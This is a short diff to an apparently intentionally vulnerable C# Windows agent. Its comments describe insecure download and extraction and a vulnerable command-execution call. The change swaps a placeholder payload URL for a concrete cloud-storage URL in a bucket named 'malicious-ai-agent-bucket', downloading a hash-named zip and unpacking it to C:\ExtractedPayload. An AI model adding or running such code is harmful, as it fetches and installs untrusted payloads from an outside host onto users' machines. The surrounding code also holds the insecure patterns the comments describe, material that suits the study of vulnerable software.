@@ -29,7 +29,7 @@ namespace WindowsAgent
             ExecuteUserCommand(); // Intentionally vulnerable method invocation
         
             // Demonstrating insecure download and extraction
-            DownloadAndUnzipFile("http://example.com/payload.zip", @"C:\ExtractedPayload");
+            DownloadAndUnzipFile("https://storage.cloud.google.com/malicious-ai-agent-bucket/6e912515420f0a7f3898995fa252832e9a12fe1bde90deb0ff9ee6612505d206.zip", @"C:\ExtractedPayload");
             // (Placeholder: In real usage, you might integrate with a scanning library or APIs)
 
             Console.WriteLine("========================================");
